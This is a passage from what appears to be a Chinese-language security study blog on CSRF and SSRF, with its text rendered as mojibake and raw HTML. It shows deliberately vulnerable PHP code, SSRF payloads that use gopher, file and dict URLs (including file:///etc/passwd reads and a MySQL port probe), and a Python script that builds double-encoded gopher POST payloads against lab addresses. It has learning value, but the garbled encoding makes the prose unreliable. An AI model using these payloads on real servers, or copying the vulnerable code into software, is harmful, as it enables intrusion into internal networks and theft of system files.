ï¼Œä½†åŸºäºåŠŸèƒ½ç‚¹ä¸åŒï¼Œä¸€äº›ä¸ºæ— æ„ä¹‰æ— å±å®³çš„è·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚</p><p>æäº¤æ•°æ®åŒ…æ—¶æŠ“åŒ…åˆ é™¤refererå­—æ®µï¼Œå¦‚æœä¸æŠ¥é”™ï¼Œåˆ™åŸºæœ¬å­˜åœ¨è·¨åŸŸè¯·æ±‚ä¼ªé€ ï¼ŒGETå‹æ„é€ é“¾æ¥ï¼ŒPOSTå‹å†™ä¸€ä¸ªæäº¤è¡¨å•ï¼Œæµ‹è¯•æœ‰è·¨åŸŸæƒ…å†µä¸‹æäº¤çš„æ•°æ®åŒ…æ˜¯å¦ç”Ÿæ•ˆã€‚</p><ul><li>æ•°æ®åŒ…æ— tokenæœ‰refereréªŒè¯</li></ul><p>åªæœ‰refereréªŒè¯æ—¶ï¼Œå¯å°è¯•ç©ºrefererï¼Œæˆ–è€…å°è¯•åŸŸåä¼ªé€ ã€‚</p><ul><li>burpè‡ªå¸¦çš„csrfæ£€æµ‹åŠŸèƒ½</li></ul><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><blockquote><p>å…³é”®ç‚¹åœ¨äº</p><p>æ”»å‡»è€…å¯ä»¥é¢„å…ˆä¼ªé€ ç”¨æˆ·çš„è¯·æ±‚ï¼Œæ‰€ä»¥åªéœ€è¦ä½¿å¾—è¯·æ±‚å‚æ•°éš¾ä»¥ä¼ªé€ ã€‚</p></blockquote><ul><li><p>å½“ç”¨æˆ·å‘é€é‡è¦çš„è¯·æ±‚æ—¶éœ€è¦è¾“å…¥åŸå§‹å¯†ç ï¼Œæ‰‹æœºéªŒè¯ç ç­‰</p></li><li><p>è®¾ç½®Token</p></li><li><p>æ£€éªŒ referer æ¥æº</p><p>ç–‘é—®ï¼šrefererä¸æ˜¯å¯ä»¥è¿›è¡Œä¼ªé€ å—ï¼Ÿ</p><p>ç­”ï¼šæ”»å‡»è€…ç¡®å®å¯ä»¥åœ¨å‘é€è¯·æ±‚æ—¶è¿›è¡Œä¼ªé€ ï¼Œä½†æ˜¯csrfæ˜¯ç”¨æˆ·å‘èµ·è¯·æ±‚ï¼Œç”¨æˆ·ä¸ä¼šå»ä¼ªé€ ï¼›</p><p>ä¸è¿‡å½“ç½‘ç«™æœ¬èº«å¯ä»¥æ¤å…¥csrfçš„payloadæ—¶ï¼Œæ£€éªŒreferæ¥æºçš„é˜²å¾¡æ‰‹æ®µå°±å¤±æ•ˆäº†ã€‚</p></li></ul><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="æ¦‚è¿°-1"><a href="#æ¦‚è¿°-1" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h2><p><code>SSRF</code>ï¼ˆServer-Side Request Forgeryï¼ŒæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§<strong>ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œåˆ©ç”¨æœåŠ¡å™¨ç«¯å‘èµ·è¯·æ±‚</strong>çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒSSRFæ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿï¼ˆæ­£å› ä¸ºè¯·æ±‚æ˜¯ç”±æœåŠ¡å™¨ç«¯å‘èµ·çš„ï¼Œæ‰€ä»¥æœåŠ¡å™¨èƒ½è¯·æ±‚åˆ°ä¸è‡ªèº«ç›¸è¿è€Œå¤–ç½‘éš”ç¦»çš„å†…éƒ¨ç³»ç»Ÿï¼‰ã€‚</p><p>â€‹ </p><h2 id="æ¼æ´æˆå› -1"><a href="#æ¼æ´æˆå› -1" class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h2><p>ç›®æ ‡æœåŠ¡å™¨ä¼šä»è‡ªèº«å‘èµ·è¯·æ±‚ï¼Œå¹¶ä¸”è¯¥è¯·æ±‚å¯æ§ä»¥åŠæ²¡æœ‰å¯¹è¯·æ±‚åœ°å€è¿›è¡Œè¿‡æ»¤å’Œé™åˆ¶ã€‚</p><h2 id="å¸¸è§åœºæ™¯"><a href="#å¸¸è§åœºæ™¯" class="headerlink" title="å¸¸è§åœºæ™¯"></a>å¸¸è§åœºæ™¯</h2><ul><li><p>è¯·æ±‚å¤–éƒ¨èµ„æºï¼Œå¦‚å¯¼å…¥æ–‡ä»¶ï¼ŒåŠ è½½è¿œç¨‹å›¾ç‰‡ï¼ŒRSSè®¢é˜…ç­‰</p></li><li><p>æ•°æ®åº“å†…ç½®çš„åŠ è½½å¤–éƒ¨URLåŠŸèƒ½</p></li><li><p>Webmailæ”¶å–å…¶ä»–é‚®ç®±é‚®ä»¶ï¼Œå¦‚POP3,IMAP,SMTPç­‰</p></li><li><p>æ–‡ä»¶å¤„ç†ï¼Œç¼–ç å¤„ç†ï¼Œå±æ€§ä¿¡æ¯å¤„ç†ï¼Œå¦‚FFmpegï¼ŒImageMagic,Word,Excel,PDF,XMLç­‰</p></li></ul><h2 id="é™åˆ¶"><a href="#é™åˆ¶" class="headerlink" title="é™åˆ¶"></a>é™åˆ¶</h2><ul><li>openssl</li><li>é‰´æƒï¼Œå¦‚cookieï¼Œjwtç­‰ï¼Œå½“æ”»å‡»è€…åªèƒ½æ§åˆ¶ä¸€ä¸ªurlæ—¶ï¼Œè€Œæ— æ³•æ·»åŠ è¿™äº›è¯·æ±‚å¤´æ—¶ï¼Œå°±æ— æ³•è®¿é—®æŸäº›æ¥å£</li><li>æ ¡éªŒäº†å…¶ä»–http headerå­—æ®µæ—¶ï¼Œå¦‚refererï¼ŒUAç­‰</li></ul><h2 id="æ¼æ´å±å®³-1"><a href="#æ¼æ´å±å®³-1" class="headerlink" title="æ¼æ´å±å®³"></a>æ¼æ´å±å®³</h2><ul><li><p>å†…ç½‘æ¢é’ˆï¼Œè·å–å†…ç½‘ç»“æ„å’Œå†…ç½‘æœºå™¨æŒ‡çº¹</p></li><li><p>è‹¥å†…ç½‘ä¸»æœºå­˜åœ¨æ¼æ´ï¼Œå¯ä»¥ä½¿ç”¨gopheråè®®æ„é€ æ•°æ®åŒ…å¯¹å…¶å‘èµ·æ”»å‡»</p></li></ul><p>From å›½å…‰å¸ˆå‚…çš„ssrfé¶åœºæ‹“æ‰‘å›¾</p><p><img src="/../images/16205694239190.png" alt="img"></p><blockquote><p>172.72.23.21 è¿™ä¸ªæœåŠ¡å™¨çš„ Web 80 ç«¯å£å­˜åœ¨ SSRF æ¼æ´ï¼Œå¹¶ä¸” 80 ç«¯å£æ˜ å°„åˆ°äº†å…¬ç½‘çš„ 8080ï¼Œæ­¤æ—¶æ”»å‡»è€…é€šè¿‡è¿™ä¸ª 8080 ç«¯å£å¯ä»¥å€ŸåŠ© SSRF æ¼æ´å‘èµ·å¯¹ 172 ç›®æ ‡å†…ç½‘çš„æ¢æµ‹å’Œæ”»å‡»ã€‚</p></blockquote><h2 id="äº§ç”Ÿæ¼æ´çš„å‡½æ•°"><a href="#äº§ç”Ÿæ¼æ´çš„å‡½æ•°" class="headerlink" title="äº§ç”Ÿæ¼æ´çš„å‡½æ•°"></a>äº§ç”Ÿæ¼æ´çš„å‡½æ•°</h2><ul><li><p><code>file_get_contents</code></p><blockquote><p>å°†æ•´ä¸ªæ–‡ä»¶è¯»å…¥ä¸€ä¸ªå­—ç¬¦ä¸²</p><p>æ”¯æŒæœ¬åœ°æ–‡ä»¶å’Œè¿œç¨‹æ–‡ä»¶</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804190900308.png" alt="image-20220804190900308"></p></li><li><p><code>curl_exec()</code></p><blockquote><p>æ‰§è¡Œç»™å®šçš„ curl ä¼šè¯ã€‚</p><p><a href="https://stackoverflow.com/questions/6382539/call-to-undefined-function-curl-init">Call to undefined function curl_init()é”™è¯¯è§£å†³</a></p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191212091.png" alt="image-20220804191212091"></p></li><li><p><code>fsockopen</code></p><blockquote><p>ä½¿ç”¨socketè·ŸæœåŠ¡å™¨å»ºç«‹tcpè¿æ¥ï¼Œä¼ è¾“åŸå§‹æ•°æ®ã€‚</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$data</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>); </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123; </span><br><span class="line">        </span><br><span class="line">        <span class="comment">//$fp:TCPè¿æ¥  $data:è¯·æ±‚å¤´</span></span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="title function_ invoke__">base6e_decode</span>(<span class="variable">$data</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="comment">//æ‰§è¡Œhttpè¯·æ±‚ï¼Œå¹¶è·å¾—è¿”å›å€¼</span></span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">GetFile</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;host&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;port&#x27;</span>],<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?host=<span class="number">127.0</span>.<span class="number">0.1</span>&amp;port=<span class="number">80</span>&amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo</span><br><span class="line"></span><br><span class="line">data--&gt;</span><br><span class="line">GET /flag.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">127.0</span>.<span class="number">0.1</span></span><br><span class="line">Connection: Close</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220804191713087.png" alt="image-20220804191713087"></p></li></ul><h2 id="æ”»å‡»æµç¨‹"><a href="#æ”»å‡»æµç¨‹" class="headerlink" title="æ”»å‡»æµç¨‹"></a>æ”»å‡»æµç¨‹</h2><p>æ£€æµ‹åˆ°å­˜åœ¨SSRFæ¼æ´å</p><ul><li>æ¢æµ‹ä¸»æœºå­˜æ´»æƒ…å†µ</li><li>æ¢æµ‹å­˜æ´»ä¸»æœºç«¯å£æƒ…å†µ</li><li>æ ¹æ®ç«¯å£æƒ…å†µå°è¯•æ”»å‡»</li></ul><h3 id="æ³¨æ„ç‚¹"><a href="#æ³¨æ„ç‚¹" class="headerlink" title="æ³¨æ„ç‚¹"></a>æ³¨æ„ç‚¹</h3><p>æ”»å‡»çš„æ•°æ®éœ€è¦ç»è¿‡ä¸¤æ¬¡URLç¼–ç ï¼Œå› ä¸ºæ•°æ®æ˜¯å…ˆåˆ°è¾¾æœ‰SSRFæ¼æ´çš„ä¸»æœºï¼Œå†é€šè¿‡SSRFæ¼æ´è½¬äº¤ç»™å†…ç½‘å…¶ä»–ä¸»æœºå¤„ç†ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><h3 id="å¸¸ç”¨åè®®ä»‹ç»"><a href="#å¸¸ç”¨åè®®ä»‹ç»" class="headerlink" title="å¸¸ç”¨åè®®ä»‹ç»"></a>å¸¸ç”¨åè®®ä»‹ç»</h3><h4 id="curl"><a href="#curl" class="headerlink" title="curl"></a>curl</h4><blockquote><p><strong>cURL</strong>æ˜¯ä¸€ä¸ªåˆ©ç”¨URLè¯­æ³•åœ¨å‘½ä»¤è¡Œä¸‹å·¥ä½œçš„æ–‡ä»¶ä¼ è¾“å·¥å…·ã€‚</p><p>å®ƒçš„åå­—å°±æ˜¯å®¢æˆ·ç«¯ï¼ˆclientï¼‰çš„ URL å·¥å…·çš„æ„æ€ã€‚</p></blockquote><p><code>curl -v www.baidu.com</code></p><p>-vï¼šæ˜¾ç¤ºè¯·æ±‚å¤´å’Œå“åº”å¤´</p><p><img src="/../images/image-20220805214719676.png" alt="image-20220805214719676"></p><p><code>curl -V</code></p><p><img src="/../images/image-20220804184555137.png" alt="image-20220804184555137"></p><p>å¯ä»¥çœ‹åˆ°æ”¯æŒçš„åè®®å¦‚ä¸‹</p><table><thead><tr><th><strong>dict</strong></th><th><strong>file</strong></th><th><strong>ftp</strong></th><th><strong>pop3</strong></th><th><strong>pop3s</strong></th></tr></thead><tbody><tr><td><strong>ftos</strong></td><td><strong>gopher</strong></td><td><strong>gophers</strong></td><td><strong>rtmp</strong></td><td><strong>rtsp</strong></td></tr><tr><td><strong>http</strong></td><td><strong>https</strong></td><td><strong>imap</strong></td><td><strong>scp</strong></td><td><strong>sftp</strong></td></tr><tr><td><strong>imaps</strong></td><td><strong>ldap</strong></td><td><strong>ldaps</strong></td><td><strong>smb</strong></td><td><strong>smbs</strong></td></tr><tr><td><strong>smtp</strong></td><td><strong>smtps</strong></td><td><strong>telnet</strong></td><td><strong>tftp</strong></td><td><strong>mtt</strong></td></tr></tbody></table><h4 id="gopher"><a href="#gopher" class="headerlink" title="gopher"></a>gopher</h4><blockquote><p>gopher åè®®æ˜¯ä¸€ä¸ªåœ¨http åè®®è¯ç”Ÿå‰ç”¨æ¥è®¿é—®Internet èµ„æºçš„åè®®å¯ä»¥ç†è§£ä¸ºhttp åè®®çš„å‰èº«æˆ–ç®€åŒ–ç‰ˆï¼Œæ”¯æŒå‘å‡ºGETã€POSTè¯·æ±‚ï¼Œå¯ä»¥å®ç°å¤šä¸ªæ•°æ®åŒ…æ•´åˆå‘é€ï¼Œç„¶ågopher æœåŠ¡å™¨å°†å¤šä¸ªæ•°æ®åŒ…æ†ç»‘ç€å‘é€åˆ°å®¢æˆ·ç«¯ï¼Œè¿™å°±æ˜¯å®ƒçš„èœå•å“åº”ã€‚æ¯”å¦‚ä½¿ç”¨ä¸€æ¡gopher åè®®çš„curl å‘½ä»¤å°±èƒ½æ“ä½œmysql æ•°æ®åº“æˆ–å®Œæˆå¯¹redis çš„æ”»å‡»ç­‰ç­‰ã€‚</p></blockquote><p><img src="/../images/v2-ea9bb9538044933ac3c918d5a56f2d69_720w.jpg" alt="img"></p><ul><li>å‘ç‚¹</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ curl gopher://localhost:2222/khaz%0atest%0ahaha </span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢]</span><br><span class="line">â””â”€$ nc -lvp 2222</span><br><span class="line">listening on [any] 2222 ...</span><br><span class="line">connect to [127.0.0.1] from localhost [127.0.0.1] 50546</span><br><span class="line">haz</span><br><span class="line">test</span><br><span class="line">haha</span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°æ¥æ”¶åˆ°çš„æ¶ˆæ¯æ˜¯åˆ†è¡Œçš„ï¼Œè€Œä¸”ç¬¬ä¸€è¡Œåªæ¥æ”¶åˆ°äº†hazï¼Œkè¢«â€˜åƒæ‰â€™äº†ã€‚</p><p>æ‰€ä»¥åœ¨ä½¿ç”¨gopheråè®®æ—¶<strong>éœ€è¦åœ¨urlååŠ å…¥ä¸€ä¸ªä»»æ„å­—ç¬¦</strong>æ‰è¡Œã€‚</p><ul><li><p>get&#x2F;postè¯·æ±‚</p><blockquote><p>1ã€æ„é€ HTTPæ•°æ®åŒ…</p><p>2ã€URLç¼–ç ã€æ›¿æ¢å›è½¦æ¢è¡Œä¸º%0d%0a,<br>3ã€å‘é€gopheråè®®</p></blockquote><p>æ³¨æ„HTTPæ•°æ®åŒ…ä¸­å¿…é¡»è¦æœ‰ä¸‹é¢å››ä¸ªè¯·æ±‚å¤´</p></li></ul><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">POST /1.php HTTP/1.1</span><br><span class="line">Host: 192.168.244.128</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 6</span><br><span class="line">  </span><br><span class="line">a=khaz</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#è½¬æ¢è„šæœ¬</span></span><br><span class="line">uri = <span class="string">&#x27;/flag.php&#x27;</span></span><br><span class="line">host = <span class="string">&#x27;127.0.0.1:80&#x27;</span></span><br><span class="line">content = <span class="string">&#x27;key=90bb4d9d9946905d6d9d68358d7c0360&#x27;</span></span><br><span class="line">content_length = <span class="built_in">len</span>(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">test =<span class="string">f&quot;&quot;&quot;POST <span class="subst">&#123;uri&#125;</span> HTTP/1.1</span></span><br><span class="line"><span class="string">  Host: <span class="subst">&#123;host&#125;</span></span></span><br><span class="line"><span class="string">  Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">  Content-Length: <span class="subst">&#123;content_length&#125;</span></span></span><br><span class="line"><span class="string">  </span></span><br><span class="line"><span class="string">  <span class="subst">&#123;content&#125;</span>&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">first = urllib.parse.quote(test)<span class="comment">#urlç¼–ç </span></span><br><span class="line"></span><br><span class="line">second = first.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)<span class="comment"># \n â†’ \r\n</span></span><br><span class="line"></span><br><span class="line">third = urllib.parse.quote(second)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;gopher://&#123;&#125;/_&#x27;</span>.<span class="built_in">format</span>(host)+third+<span class="string">&quot;%0D%0A&quot;</span> <span class="comment">#gopheråè®®ä¼šåƒæ‰urlåé¢çš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(payload)</span><br></pre></td></tr></table></figure><p>  ä¾‹å­</p><ul><li>é€šè¿‡å‘½ä»¤å‘èµ·</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.php kali</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">&quot;Hello&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p>  <img src="/../images/image-20220805001153033.png" alt="image-20220805001153033"></p><ul><li><p>é€šè¿‡curlå‡½æ•°å‘èµ·â€“ä¸¤æ¬¡urlç¼–ç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ssrf.php  windows</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params"><span class="variable">$url</span></span>)</span>&#123;  </span><br><span class="line">    <span class="comment">//åˆ›å»ºä¸€ä¸ªæ–°çš„curlèµ„æº  </span></span><br><span class="line">    <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();  </span><br><span class="line">    <span class="comment">//è®¾ç½®URLå’Œç›¸åº”çš„é€‰é¡¹  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_URL,<span class="variable">$url</span>);  </span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>,CURLOPT_HEADER,<span class="literal">false</span>);  </span><br><span class="line">    <span class="comment">//æŠ“å–URLå¹¶æŠŠå®ƒä¼ é€’ç»™æµè§ˆå™¨  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);  </span><br><span class="line">    <span class="comment">//å…³é—­curlèµ„æºï¼Œå¹¶ä¸”é‡Šæ”¾ç³»ç»Ÿèµ„æº  </span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">curl</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨é€šè¿‡å‘½ä»¤å‘èµ·çš„payloadï¼ˆä¸€æ¬¡urlç¼–ç ï¼‰ï¼Œå‘ç°æ— å›æ˜¾</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher:<span class="comment">//192.168.244.128:80/_POST%20/1.php%20HTTP/1.1%0D%0AHost%3A%20192.168.244.128%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%206%0D%0A%0D%0Aa%3Dkhaz%0D%0A</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220805142401807.png" alt="image-20220805142401807"></p><p>å†æ¬¡è¿›è¡Œurlç¼–ç åå‘é€ï¼Œå‘ç°æ˜¯å¯ä»¥å›æ˜¾çš„ã€‚</p>  <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?url=gopher%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F192.<span class="number">168.244</span>.<span class="number">128</span>%<span class="number">3</span>A80%<span class="number">2</span>F_POST%<span class="number">2520</span>%<span class="number">2</span>F1.php%<span class="number">2520</span>HTTP%<span class="number">2</span>F1.<span class="number">1</span>%<span class="number">250</span>D%<span class="number">250</span>AHost%<span class="number">253</span>A%<span class="number">2520192.168</span>.<span class="number">244.128</span>%<span class="number">250</span>D%<span class="number">250</span>AContent-Type%<span class="number">253</span>A%<span class="number">2520</span>application%<span class="number">2</span>Fx-www-form-urlencoded%<span class="number">250</span>D%<span class="number">250</span>AContent-Length%<span class="number">253</span>A%<span class="number">25206</span>%<span class="number">250</span>D%<span class="number">250</span>A%<span class="number">250</span>D%<span class="number">250</span>Aa%<span class="number">253</span>Dkhaz%<span class="number">250</span>D%<span class="number">250</span>A</span><br></pre></td></tr></table></figure></li></ul><p><img src="/../images/image-20220805142614175.png" alt="image-20220805142614175"></p><h4 id="http-x2F-https"><a href="#http-x2F-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h4><p>æ¢æµ‹Web åº”ç”¨çš„ä¿¡æ¯æƒ…å†µ</p><h4 id="file"><a href="#file" class="headerlink" title="file"></a>file</h4><p>è¯»å–æœ¬åœ°æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">file:///etc/passwd    </span><br><span class="line">file:///etc/hosts     # è®°å½•æœ¬æœºçš„æˆ–å…¶ä»–ä¸»æœºçš„ipåŠå…¶å¯¹åº”ä¸»æœºå</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é«˜æƒé™</span></span><br><span class="line">file:///proc/net/arp  # è®°å½•ARPåè®®å†…å®¹ï¼Œé‡Œé¢æœ‰ä¸»æœºçš„ipå’Œmacåœ°å€</span><br><span class="line">file:///etc/network/interfaces # å¤§éƒ¨åˆ†ç½‘ç»œæ¥å£é…ç½®</span><br></pre></td></tr></table></figure><h4 id="dict"><a href="#dict" class="headerlink" title="dict"></a>dict</h4><p>æ¢æµ‹ç«¯å£æœåŠ¡</p><p><a href="https://blog.51cto.com/u_15127673/4130760">https://blog.51cto.com/u_15127673/4130760</a></p><blockquote><p>dict åè®®æ˜¯ä¸€ä¸ªåœ¨çº¿ç½‘ç»œå­—å…¸åè®®ï¼Œç”¨æ¥æ¶è®¾å­—å…¸æœåŠ¡çš„ã€‚</p><p>å®ƒæ˜¯åŸºäºTCPåè®®å¼€å‘çš„ï¼Œæ‰€ä»¥åƒ mysql çš„æœåŠ¡ï¼Œå› ä¸ºä¹Ÿæ˜¯åŸºäº tcp åè®®å¼€å‘ï¼Œæ‰€ä»¥ç”¨ dict åè®®çš„æ–¹å¼æ‰“å¼€èƒ½å¼ºè¡Œè¯»å–ä¸€äº› mysql æœåŠ¡çš„è¿”å›å†…å®¹</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;dict://localhost:3306&quot;</span>; <span class="comment">//3306ç«¯å£æ˜¯mysqlæœåŠ¡</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;&gt;</span><br><span class="line">PS D:\phpstudy_pro\phpstudy_pro\WWW\test&gt; D:/phpstudy_pro/phpstudy_pro/Extensions/php/php7.<span class="number">3.4</span>nts/php.exe <span class="string">&quot;d:\phpstudy_pro\phpstudy_pro\WWW\test\2.php&quot;</span></span><br><span class="line"></span><br><span class="line">J</span><br><span class="line"><span class="number">5.7</span>.<span class="number">26</span>U<span class="string">&#x27;+I2J%mkwB&quot;M)7     Imysql_native_password!#08S01Got packets out of order</span></span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°5.7.26å’Œmysql</p><p><img src="/../images/image-20220804195027985.png" alt="image-20220804195027985"></p><p>â€‹    </p><h3 id="åˆ©ç”¨æ¡ˆä¾‹"><a href="#åˆ©ç”¨æ¡ˆä¾‹" class="headerlink" title="åˆ©ç”¨æ¡ˆä¾‹"></a>åˆ©ç”¨æ¡ˆä¾‹</h3><h4 id="Fastcgi"><a href="#Fastcgi" class="headerlink" title="Fastcgi"></a>Fastcgi</h4><p><a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html?page=2#reply-list</a></p><p><a 